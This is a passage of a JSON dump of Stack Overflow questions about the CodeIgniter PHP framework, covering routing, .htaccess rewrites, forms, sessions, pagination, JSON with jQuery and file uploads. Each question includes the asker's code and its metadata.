 $cookie = array(\n                            'name'      =&gt; $this-&gt;cookie_name,\n                            'value'     =&gt; $this-&gt;uri-&gt;segment(3),\n                            'expire'    =&gt; '86500',\n                            'domain'    =&gt; '.language.com',\n                            'secure'    =&gt; true\n                            );\n\n            set_cookie($cookie);\n\n            redirect(null, 'refresh');\n        }\n    }\n\n    public function get_language()\n    {\n        if (! get_cookie($this-&gt;cookie_name))\n        {\n            echo 'Cookie not set';\n        }\n        else\n        {\n            echo get_cookie($this-&gt;cookie_name);\n        }   \n    }\n</code></pre>\n\n<p>}</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13085466,"title":"CodeIgniter .htaccess links","body":"<p>I am new to codeIgniter and .htaccess stuff.\nI already made to remove the index.php to <code>localhost/ci/index.php/site/home</code>.\nSo my home page can access now to <code>localhost/ci</code> or <code>localhost/ci/site/home</code>.</p>\n\n<p>I have</p>\n\n<pre><code>&lt;a href=\"home\"&gt;Home&lt;/a&gt; and &lt;a href=\"about\"&gt;About&lt;/a&gt;\n</code></pre>\n\n<p>I can access Home and About if I Am on this link <code>localhost/ci/site/home</code>.\nBut once I'm on <code>localhost/ci</code> the problem exists because when I click to <code>&lt;a href=\"about\"&gt;About&lt;/a&gt;</code> the site is redirecting me to <code>localhost/ci/about</code> instead of <code>localhost/ci/site/about</code>. I change the links to <code>&lt;a href=\"site/home\"&gt;Home&lt;/a&gt; and &lt;a href=\"site/about\"&gt;About&lt;/a&gt;</code> the browser keeps adding the <code>/site</code> every click like\n<code>localhost/ci/site/site/site/site/site/site/home</code></p>\n\n<p>Anyone can help me to fix the problem?</p>\n\n<p>.htaccess</p>\n\n<pre><code> &lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /ci\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\nErrorDocument 404 /index.php\n</code></pre>\n\n<p>  </p>\n"},{"tags":["php","jquery","ajax","json","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":65,"score":1,"question_id":13086779,"title":"Can't get properties from JavaScript object created from JSON data generated by PHP script","body":"<p>I have a PHP script that makes query to DB and returns the result as JSON data. This file contains some Codeigniter specific functions.</p>\n\n<p>This functions recieve id and returns back to the JS code some data from a table.</p>\n\n<pre><code>public function get_l($id){\n//$id is not empty variable\n$this-&gt;db-&gt;where('id',$id);\n$q=$this-&gt;db-&gt;get('news');\n\n$res = $q-&gt;result_array();\n\n$this-&gt;output-&gt;set_header(\"HTTP/1.0 200 OK\");\n$this-&gt;output-&gt;set_header(\"HTTP/1.1 200 OK\");\n$this-&gt;output-&gt;set_header(\"Cache-Control: no-store, no-cache, must-revalidate\");\n$this-&gt;output-&gt;set_header(\"Cache-Control: post-check=0, pre-check=0\");\n$this-&gt;output-&gt;set_header(\"Content-Type: application/json; charset=utf-8\");\n$this-&gt;output-&gt;set_header(\"Pragma: no-cache\");\n\n$out = json_encode($res);\n$this-&gt;output-&gt;set_output($out);\n}\n</code></pre>\n\n<p>And then I need to process that JSON with the next JS code:</p>\n\n<pre><code>function getContent(id){\n  $.post('/admin_ajax/news/get',\n  {\n    id: id\n\n  },\n  function(result)\n  {\n    alert(result+\"\\n\"+result.length);//this will output [object Object] 1\n    for (var key in result)\n    {\n      alert(key+':'+result[key]); //and this 0:[object Object]\n    }\n    alert(result.title); //here we are getting undefined\n  },\n  'json'\n);\n</code></pre>\n\n<p>I am not receiving errors or warnings in console. And in the firebug I see what was returned from the server.</p>\n\n<p>HTTP headers:</p>\n\n<pre><code>Server  nginx/1.1.19\nDate    Fri, 26 Oct 2012 11:59:12 GMT\nContent-Type    application/json; charset=utf-8\nContent-Length  85\nConnection  keep-alive\nX-Powered-By    PHP/5.3.10-1ubuntu3.4\nCache-Control   post-check=0, pre-check=0\nPragma  no-cache\n</code></pre>\n\n<p>And response:</p>\n\n<pre><code>[{\"id\":\"5\",\"title\":\"test\",\"alias\":\"test\",\"content\":\"tes\",\"date\":\"123\",\"type\":\"test\"}]\n</code></pre>\n\n<p>JSON:</p>\n\n<pre><code>alias  \"test\"\n\ncontent \"tes\"\n\ndate  \"123\"\n\nid \"5\"\n\ntitle \"test\"\n\ntype \"test\"\n</code></pre>\n\n<p>I found a similar question <a href=\"http://stackoverflow.com/questions/10800811/try-to-return-json-data-generated-with-sql-statement-from-php-script-to-js-webpa\">here</a> but it wasn't helpful.</p>\n"},{"tags":["codeigniter","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13080545,"title":"Deleting current item in object with foreach - CodeIgniter","body":"<p>I am using CodeIgniter and want to remove an item from object in a loop</p>\n\n<pre><code>foreach($query-&gt;result() as $row){\n     if($row-&gt;parent_id == 1){\n         // code here to delete current record\n    }\n}\n</code></pre>\n\n<p>I want to use foreach to loop all record. In case current item in loop meet condition in if,  delete current row in $query object.</p>\n\n<p>Can I delete current record in $query object in CodeIgniter Or Have others way to do that?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13083213,"title":"Wrong catch default value into textbox with CodeIgniter","body":"<p>I have problem load default data into textbox on controller, but when i use i submit form validate. It still catch the same value in textbox that we load default data. When false validation i dont want to show default value again.</p>\n\n<p>How to solve?</p>\n\n<p>Code in controller</p>\n\n<p>$data['defaultvalue'] ='Hello' </p>\n\n<pre><code>   if($this-&gt;input-&gt;post('btntransfer')!=\"\"){\n   if ($this-&gt;form_validation-&gt;run() == FALSE){  \n\n    }else{\n\n    }\n</code></pre>\n\n<p>COde in View:</p>\n\n<pre><code>&lt;form method=\"post\"&gt;\n&lt;input type=\"text\"  id=\"txt1\" name=\"txt1\" value=\"&lt;?php echo $defaultvalue?$defaultvalue:''; ?&gt;\"/&gt;\n&lt;input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Transfer\" /&gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13085388,"title":"sending an url but staying on the same page ( php, codeigniter, javascript )","body":"<p>this is my situation. I'm writing an webinterface in codeigniter to send commands to a virtual server. these commands are passed through the browser in an url. </p>\n\n<p>example : <a href=\"http://server.com/TgtSendIRCommand?id=UM-02&amp;code=KEY_UP\" rel=\"nofollow\">http://server.com/TgtSendIRCommand?id=UM-02&amp;code=KEY_UP</a>\nthis server then takes action and the web interface refreshes the screenshot. </p>\n\n<p>i just want to have a bunch of links in html that send this command to the browser. \nBut if i click the links, the user has to stay on the same page. So the command is sended but there is no other interaction. </p>\n\n<p>i am using codeigniter. </p>\n\n<p>Any suggestions ? </p>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":588,"score":0,"question_id":5660321,"title":"Codeigniter: Submitted form is not showing values","body":"<p>Kindly have a visit on following link: <a href=\"http://articlecon.com/phpdemo/b1/admin/bid_type/create\" rel=\"nofollow\">Demo link for problem</a> </p>\n\n<p>You can view that form is not showing submitted values and not uploading file.</p>\n\n<p>Following is form code :</p>\n\n<pre><code>&lt;form id=\"frm\" name=\"frm\"  method=\"post\" enctype=\"multipart/form-data\"&gt;\n            &lt;fieldset class=\"fieldset2\"&gt;\n\n                &lt;legend class=\"legend2\"&gt;Add Bid Type&lt;/legend&gt;\n\n                &lt;div class=\"form_fields\"&gt;\n\n                &lt;p&gt;\n                &lt;label for=\"subject\" class=\"label2\"&gt;Bid Type:&lt;/label&gt;\n                &lt;input type=\"input\" id=\"type\" name=\"type\" class=\"textfield2\" /&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;\n                &lt;label for=\"subject\" class=\"label2\"&gt;Bid Type Code:&lt;/label&gt;\n                &lt;input type=\"input\" id=\"code\" name=\"code\" class=\"textfield2\" /&gt;\n                &lt;/p&gt;\n\n\n                &lt;p&gt;\n                &lt;label for=\"description\" class=\"label2\"&gt;Bid Type Description:&lt;/label&gt;\n                &lt;textarea id=\"description\" name=\"description\" class=\"textarea2\"&gt;&lt;/textarea&gt;\n                &lt;/p&gt;\n\n\n\n\n                &lt;p&gt;\n                &lt;label for=\"userfile\" class=\"label2\"&gt;Icon:&lt;/label&gt;\n                &lt;input type=\"file\" id=\"userfile\" name=\"userfile\" class=\"input_file\"  /&gt;\n                &lt;/p&gt;\n\n\n                &lt;/div&gt;\n\n            &lt;/fieldset&gt;\n\n            &lt;fieldset class=\"none\"&gt;\n            &lt;p&gt;\n                &lt;input type=\"submit\" id=\"btnsubmit\" name=\"btnsubmit\" class=\"btn\" value=\"Add\" /&gt;\n    &lt;input type=\"reset\" id=\"btnreset\" name=\"btnreset\" class=\"btn\" value=\"Reset\" /&gt;\n            &lt;/p&gt;\n            &lt;/fieldset&gt;\n        &lt;/form&gt;`\n</code></pre>\n\n<p>And following is controller code :</p>\n\n<pre><code>function create() {\n\n        $data = '';\n\n\n        echo '&lt;pre&gt;';\n        echo 'below is Post Fields Data:&lt;br&gt;';  \n        print_r($this-&gt;input-&gt;post());\n        echo '&lt;br&gt;Post Fields Data Ends: ';     \n\n    echo '&lt;/pre&gt;';\n\n\n\n        $this-&gt;form_validation-&gt;set_rules('type', 'Bid Type', 'trim|required|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('code', 'Bid Type Code', 'trim|xss_clean');\n\n        $this-&gt;form_validation-&gt;set_rules('description', 'Bid Type description', 'trim|xss_clean');\n\n        $data['errors'] = array();\n\n        if ($this-&gt;form_validation-&gt;run()) {\n                $data = array(\n                    'code'          =&gt; $this-&gt;form_validation-&gt;set_value('code'),\n                    'type'          =&gt; $this-&gt;form_validation-&gt;set_value('type'),\n                    'description'   =&gt; $this-&gt;form_validation-&gt;set_value('description'),\n\n                );\n\n                if (!is_null($this-&gt;bid_types-&gt;create_bid_type($data))){\n                        $data['errors']['success'] = 'Record Successfully Added!';\n\n\n                } else {\n\n                    $errors = $this-&gt;bid_types-&gt;get_error_message();\n                    foreach ($errors as $k =&gt; $v)   $data['errors'][$k] = $this-&gt;lang-&gt;line($v);\n\n                }       \n\n        $config['upload_path'] = base_url().'resource/images/uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        //$config['max_size']   = '100';\n        //$config['max_width']  = '1024';\n        //$config['max_height']  = '768';\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {\n        $data['errors']['upload'] = 'Not Uploaded';\n        //$data['errors']['upload'] = $this-&gt;upload-&gt;display_errors();\n        //$error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        //$this-&gt;load-&gt;view('upload_form', $error);\n    }\n    else\n    {\n        $data['errors']['upload'] = 'Yes Uploaded';\n        //$data['errors']['upload'] = $this-&gt;upload-&gt;data();\n        //$data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n        //$this-&gt;load-&gt;view('upload_success', $data);\n    }\n\n    echo '&lt;pre&gt;';           \n        print_r($this-&gt;upload-&gt;data());\n\n    echo '&lt;/pre&gt;';\n\n        } /* END OF FORM VALIDATRION RUN */\n\n        if(!$this-&gt;input-&gt;is_ajax_request() &amp;&amp; !$this-&gt;input-&gt;get_post('is_ajax'))\n        {   \n            $this-&gt;load-&gt;view('bend/bid_type/create', $data);\n\n        }                               \n\n\n} /* END OF FUNCTION CREATE */ \n</code></pre>\n\n<p>Can some one guide me what and where Iam doing wrong and how it can be rectrified.</p>\n"},{"tags":["php","javascript","jquery","json","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13085273,"title":"Loop through this json object (jquery) with Codeigniter","body":"<p>I've created a controller &amp; view as follows - I am trying to loop through the jSON object - can anyone assist?</p>\n\n<p>Can anyone demonstrate how to loop through the json object in the view?</p>\n\n<pre><code>//Controller PHP function:\npublic function ajax_get_all()\n{\n    $stockists = $this-&gt;stockists_model-&gt;get_all();\n    header('Content-type: application/json');\n    echo json_encode($stockists);\n}\n\n//HTML View\n\n&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n$(function() {\n// Stuff to do as soon as the DOM is ready;\n$.getJSON(\"/stockists/ajax_get_all\", function(data) {\n    var obj = jQuery.parseJSON(data);\n    //console.log(obj);\n  });\n});\n</code></pre>\n\n<p></p>\n"},{"tags":["php","codeigniter","file-get-contents"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13084530,"title":"php custom mvc framework | Load a view file as a string","body":"<p>I want to implement functionality like CodeIgniter does in its loadview function - \nWhile loading the view we pass third parameter \"true\" so that the page will be taken as a string.</p>\n\n<p>Using <code>file_get_contents()</code> is correct option while wrting custom mvc framework ?</p>\n\n<p>I hav a function to load view as - </p>\n\n<pre><code>function loadView($directoryPath, $page, $data = array()) {\n\n        extract($data);\n        // construct path for loading the view\n        $viewURL = $GLOBALS['config']['dir-views'];\n        $path = $viewURL . DS . $directoryPath . DS . $page;\n\n        // actual loading of a view.  \n        include $path;\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","session","google-chrome"],"answer_count":1,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":70,"score":4,"question_id":13069098,"title":"Session got reset in chrome","body":"<p>I have two domains <code>abc.com</code> and <code>xyz.com</code> in one server,both have the exact code.The problem is in xyz.com the codeigniter session variable got reset on page refresh in chrome browser.But there is no such issues in abc.com.It works fine in Mozilla in both domains.What will be the root of issue?Is it related with domain,htaccess?Please advice.</p>\n"},{"tags":["php","ajax","codeigniter","google-chrome"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13084534,"title":"Codeignator Session lost in Chrome","body":"<p>I have two domains abc.com and xyz.com both are in same server. Same code is running in both domains. But when i use xyz.com session lost in chrome. No issues in other browsers its work fine. In abc,com works fine in all browsers. Please help me</p>\n"},{"tags":["codeigniter","javascript-events"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13083462,"title":"How to do parent window refresh and close child after successfull validation using codeigniter anchor_popup method?","body":"<p>How to do parent window refresh and close child after successfull validation using codeigniter anchor_popup method?Does Code igniter anchor_popup() method support javascript function call?Is there any solution to do this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":776,"score":0,"question_id":2670172,"title":"CodeIgniter Encryption Class - How do I?","body":"<p>I have created a registration page using CI that works fine. However, I encoded the password using sha1 (see code snippet below), and now that I plan to create a login page, I need to check whether the password the user enters in the login page is the same as that password encoded using sha1 stored in the database. However, I just realized that sha1 is non-decodable.</p>\n\n<p>So how do I use CI's encryption class to both encrypt and then decrypt this password for login purposes? Any assistance will be appreciated. Thanks in advance.</p>\n\n<blockquote>\n  <p>function register_user($username, $password, $name, $email, $activation_code){  </p>\n\n<pre><code> $sha1_password = sha1($password);  \n $query_str = \"INSERT INTO table_name (username, password, name, email, activation_code) &gt;VALUES (?,?,?,?,?)\";    \n\n\n$this-&gt;db-query($query_str, array($username, $sha1_password, $name, $email, $activation_code));\n</code></pre>\n  \n  <p>}</p>\n</blockquote>\n"},{"tags":["codeigniter"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1712,"score":1,"question_id":6786013,"title":"not able get post form submit values in codeigniter","body":"<p>I tried a simple form submit But I am not able to get the form values on controller using <code>$this-&gt;input-&gt;post</code> as well as <code>$_POST[]</code> methods. My view part is</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt; Feedback page&lt;/title&gt;       \n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;?php echo form_open('feedback/save'); ?&gt;       \n    &lt;p&gt;\n        &lt;label&gt;name: &lt;/label&gt;\n        &lt;?php echo form_input('name'); ?&gt;\n\n    &lt;/p&gt;\n    &lt;p&gt;\n    &lt;label&gt;Email: &lt;/label&gt;\n        &lt;?php echo form_input('email'); ?&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n    &lt;label&gt;Feedback: &lt;/label&gt;\n        &lt;?php echo form_textarea('feedback'); ?&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n        &lt;?php echo form_submit('submit','Submit'); ?&gt;\n    &lt;/p&gt;\n\n    &lt;?php echo form_close(); ?&gt;\n\n&lt;/body&gt; \n\n&lt;/html&gt;\n</code></pre>\n\n<p>and controller part is</p>\n\n<pre><code>&lt;?php\nclass Feedback extends CI_Controller {\n\nfunction __construct() {\n    parent::__construct();      \n    $this-&gt;load-&gt;model(\"MFeedback\");\n\n}\nfunction index() {\n\n    $this-&gt;load-&gt;view('home/feedback_view.php');\n    //print \"loaded\";\n\n\n}\n\nfunction save() {\n    print \"called\";     \n    print_r($this-&gt;input); \n    $name = $this-&gt;input-&gt;post('uname');\n    $email = $this-&gt;input-&gt;post('email');\n    $feedback = $this-&gt;input-&gt;post('feedback');\n    print $name . $email . $feedback;\n    $this-&gt;index();\n}\n\n}\n?&gt;\n</code></pre>\n\n<p>I am not sure what went wrong here or is there any config settings I need to look in to it.?</p>\n"},{"tags":["codeigniter","codeigniter-2","hmvc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13082270,"title":"cant pass variable to view in hmvc","body":"<p>hey guys was hoping you could help me out.</p>\n\n<p>I am working on a project with codeigniter and HMVC library, and having some problems sending parameters to a view.</p>\n\n<p>I basically have a module, that calls another module (by run::modules()), that loads a view. both modules are extended using MX_Controller</p>\n\n<p>This is how the controller looks. </p>\n\n<p>the thing is, if I load the view before the <code>if($this-&gt;form_validation-&gt;run()==false )</code> line it works, but if i place after this line it does not work.</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('username', 'Username', 'required');\n$this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required');\n\n$username=$this-&gt;input-&gt;post('username');\n$password=$this-&gt;input-&gt;post('password');\n\nif($this-&gt;form_validation-&gt;run()==false ){\n\n    return $this-&gt;load-&gt;view('login',array(),true);\n}\nelse{\n$this-&gt;load-&gt;view('login',array('show_captcha'=&gt;false);\n}\n</code></pre>\n\n<p>and basically even if I simply do \"<strong>if($show_captcha)</strong>\" anywhere in the code it gives me the  <strong>Undefined variable: show_captcha</strong> error.</p>\n"},{"tags":["php","codeigniter","codeigniter-2","codeigniter-url","codeigniter-routing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13069694,"title":"CodeIgniter show accessed route/translated controller on 404 page","body":"<p>Now, when CodeIgniter does not find a controller for a route or a route for the uri, it shows a generic 404 page. How can I show the accessed route or controller or something useful that would allow me to debug why it's showed a 404?</p>\n\n<p>Code:</p>\n\n<pre><code>switch ($_SERVER['HTTP_HOST']) {\n    case 'multiplelines.geomoldova.ro': \n             $route['default_controller'] = \"subdomain\"; break;\n    default: $route['default_controller'] = \"welcome\"; break;\n}\n\n\n$route['scaffolding_trigger'] = \"\";\n$route['404_override'] = '';\nif($_SERVER['HTTP_HOST'] == \"www.geomoldova.ro\" \n   || $_SERVER['HTTP_HOST'] == \"geomoldova.ro\")\n{\n  // URI like '/en/about' -&gt; use controller 'about'\n  $route['^(romana|english|magyar)/(.+)$'] = \"$2\";\n\n  // '/en', '/de', '/fr' and '/nl' URIs -&gt; use default controller\n  $route['^(romana|english|magyar)$'] = $route['default_controller'];\n}\nelse\n{\n\n}\n</code></pre>\n\n<p>Desired effect:\nWhen on www or empty subdomain routing will occur like this:\n/language/test will go to test controller</p>\n\n<p>When on another subdomain (I just listed one case) will be routing to the subdomain controller as I just want to use one controller for those.</p>\n\n<p>Note: Now when on www or empty subdomain there is code to choose the language automatically for /test route for test controller (without language directory in uri).</p>\n"},{"tags":["php","codeigniter","amazon-ec2","amazon-web-services","rds"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13081958,"title":"php API receiving and logging incoming millions of httprequests but sometime do not forward it to other http request","body":"<p>I am designing a high throughput system with AWS ec2; where in i have established a load balancer with couple of machine's behind it, the code running in both machines is a code-igniter based php api, working with RDS mysql [high instance] and couchdb for logging purposes.</p>\n\n<p>The soul purpose of the api is to log the incoming http requests [in couchdb], and call another third party http api, get the response from it and log the output [in couchdb] and return the response.</p>\n\n<p>Problem is at times when the load increases, the Request count at my side shows the right count but the third party api says, i haven't sent so many requests, sometimes the number of requests forwarded to third party shows up as 1/10th of actual load; the third party is a very reliable service; the response count is as low as the third party's counts.</p>\n\n<p>I am clueless, as to how to curb this; i optimized the RDS based solutions, upgraded instances to high but no effect.</p>\n"},{"tags":["php","mysql","codeigniter","activerecord"],"answer_count":3,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":2339,"score":6,"question_id":7421873,"title":"codeigniter active record get query and query without the LIMIT clause","body":"<p>im using active record, its all working ok but i want to set the <strong>$data[\"totalres\"]</strong> to the total results, i mean, the same query but without the <strong>LIMIT</strong></p>\n\n<p>the problem is the previous statements gets unset when you do a query modifier, so i cant even add the $this->db->limit() after i get the results.</p>\n\n<p>any ideas? i think its a bad practice to 'duplicate' the query just to do this</p>\n\n<pre><code>function get_search($start, $numrows, $filter = array())\n{    \n\n    ...\n\n    $this-&gt;db\n    -&gt;select(\"emp\")\n    -&gt;from('emp')\n    -&gt;join('empr', 'empr.b = empr.id', 'left')\n    -&gt;like('code', $code)\n    -&gt;limit($numrows, $start);\n\n    ...\n\n    $q = $this-&gt;db-&gt;get();        \n\n    // number of rows WITHOUT the LIMIT X,Y filter\n    $data[\"totalres\"] = ???????;        \n\n    if ($q-&gt;num_rows() &gt; 0)\n    {        \n        $data[\"results\"] = $q-&gt;result();\n    } else {\n        $data[\"results\"] = array();\n    }   \n\n    return $data;\n}    \n</code></pre>\n"},{"tags":["file","codeigniter","localization"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":1603,"score":2,"question_id":2018755,"title":"Loading multiple language files in CodeIgniter","body":"<p>Can I load multiple language files for the same view in CodeIgniter?</p>\n"},{"tags":["codeigniter","codeigniter-2","hmvc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":725,"score":2,"question_id":10439948,"title":"Codeigniter template library and HMVC ( mx library ) the static method run()","body":"<p>i have this testing code which am working with ..\ni have a module called <code>ms</code> and and another one called <code>test</code>\nthe <code>test</code> controller code is :</p>\n\n<pre><code>&lt;?php\nclass Test extends MX_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;template-&gt;title($this-&gt;config-&gt;item('site_name','app'));\n    }\n\n    public function index()\n    {\n        $this-&gt;template-&gt;build('index');\n    }\n}\n</code></pre>\n\n<p>and the code inside <code>ms</code> is :</p>\n\n<pre><code>&lt;?php\n//ms module\nclass Msrofi extends MX_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;template-&gt;title($this-&gt;config-&gt;item('site_name','app'));\n    }\n\n    public function index()\n    {\n        $t = Modules::run('test/test/index');\n        var_dump($t);\n        $this-&gt;template-&gt;build('index_message');\n    }\n}\n</code></pre>\n\n<p>the problem is that the build function inside <code>test</code> is trying to find the <code>index</code> view file inside the <code>ms</code> views folder not the <code>test</code> views folder ..\ni checked the <code>$this-&gt;_module</code> and it gave me the <code>ms</code> module name ..\nany one know how to fix that ??</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":69,"score":-2,"question_id":13078334,"title":"I am to load a profile image into a database called profiles, but how i can actually display the profile on screen?","body":"<p>My profiles Model file:</p>\n\n<pre><code>function putProfileImage($user, $image)\n{\n\n\n    $record = array('user' =&gt; $user, 'profileimage' =&gt; $image);\n    if ($this-&gt;exists($user))\n    {\n        $this-&gt;db-&gt;where('user', $user)-&gt;update('profiles', $record);\n    }\n    else\n    {\n        $this-&gt;db-&gt;where('user', $user)-&gt;insert('profiles', $record);\n    }\n}\n\nfunction getProfileImage($user)\n{\n\n    $config = array(\n            'allowed_types' =&gt; 'jpg|jpeg|gif|png',\n            'height' =&gt; 200,\n            'length' =&gt; 150\n    );\n\n\n    $this-&gt;db-&gt;select('*')-&gt;from('profiles')-&gt;where('user', $user);\n    $query = $this-&gt;db-&gt;get();\n    $row = $query-&gt;row();\n    return $row-&gt;profileimage; //Trying to get property of non-object error\n\n\n}\n</code></pre>\n\n<p>its the getProfileimage, similar to a do_upload function where im having the most trouble</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":97,"score":-2,"question_id":7056826,"title":"Help me set URL using .htaccess in CodeIgniter","body":"<p>I use CodeIgniter and I want to set URL by htaccess. I have tried many ways but have not succeeded yet.</p>\n\n<p>My folder structure :</p>\n\n<pre><code>--application\n----corntrollers\n-------public\n----------home.php\n----------log\n-------------- login.php\n-------admin\n----views\n-------public\n----------home.tpl\n----------log\n-------------- login.tpl\n--system\n--mysite\n</code></pre>\n\n<p>I want to set URL to rewrite :</p>\n\n<pre><code>http://localhost/mysite/index.php/log/login\n=&gt;\nhttp://localhost/mysite/log-in\n</code></pre>\n\n<p>How can I do that ?</p>\n"},{"tags":["php","codeigniter","file-download"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13067903,"title":"Invalid Image if Image is large CodeIginiter","body":"<p>I'm using this code to download a file:</p>\n\n<pre><code>if ($file_name) {\n    $file_url = $file_name;\n    header('Content-Type: application/octet-stream');\n    header(\"Content-Transfer-Encoding: Binary\");\n    header(\"Content-disposition: attachment; filename=\\\"\" . $file_url . \"\\\"\");\n    ob_clean();\n    flush();\n    readfile($file_url);\n}\n</code></pre>\n\n<p>It downloads small file properly but when file size is large then, for Image files (like <code>.jpg</code>) saying <code>Invalid Image</code>. And for <code>.pdf</code> it is says <code>invalid format</code>. I'm using CodeIgniter framework.</p>\n\n<p><strong>$file_name</strong> start with <code>https://</code></p>\n"},{"tags":["php","codeigniter","hyperlink","controller","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13068179,"title":"Codeigniter Pagination link is not working","body":"<p>so many pagination question on stackoverflow, but i can't see it with codeigniter, so here it goes.</p>\n\n<p>we need to look at these picture\n<img src=\"http://i.stack.imgur.com/XwSSo.png\" alt=\"enter image description here\"></p>\n\n<p>and here</p>\n\n<p><img src=\"http://i.stack.imgur.com/kA4IG.png\" alt=\"enter image description here\"></p>\n\n<p>and here</p>\n\n<p><img src=\"http://i.stack.imgur.com/eD5OL.png\" alt=\"enter image description here\"></p>\n\n<p>i have ten record on the table, and the link is not working, here is the <code>controller/index</code></p>\n\n<pre><code>$query = $this-&gt;m_kategorimaterial-&gt;get();  \n    $config['base_url'] =  base_url().'index.php/c_kategorimaterial/index/';\n    $config['total_rows'] = $query-&gt;num_rows();\n    $config['per_page'] = 5; \n    $this-&gt;pagination-&gt;initialize($config);\n    $data['rows'] = $query-&gt;result();\n    $data['title'] = 'QB Kategori Material';\n    $this-&gt;load-&gt;view('menu',$data);\n    $this-&gt;load-&gt;view('v/vkategorimaterial');\n</code></pre>\n\n<p>and here is the model</p>\n\n<pre><code> $this-&gt;db-&gt;order_by('Kode_Kategori_Material_Jasa','DESC');\n    $query = $this-&gt;db-&gt;get('ms_kategori_material');\n    return $query;\n</code></pre>\n\n<p>why does the link is not working ? how do i resolve it ? Thank you stackoverflow</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13078487,"title":"CodeIgniter - is there a GUI based library for cropping an image?","body":"<p>CodeIgniter - is there a GUI based library for cropping an image?</p>\n\n<p>I want to select exactly what and where to crop. Ideally I want to be able to go to</p>\n\n<p>mysite.com/manageImage/crop/example-image.jpg</p>\n\n<p>and it would show the interface to crop it, then crop that image.</p>\n"},{"tags":["codeigniter","variables","passing","errors"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13078215,"title":"CodeIgniter, Message: Undefined variable, Passing data","body":"<p><strong>>> My controllerv - verifyregistration</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass verifyregistration extends CI_Controller 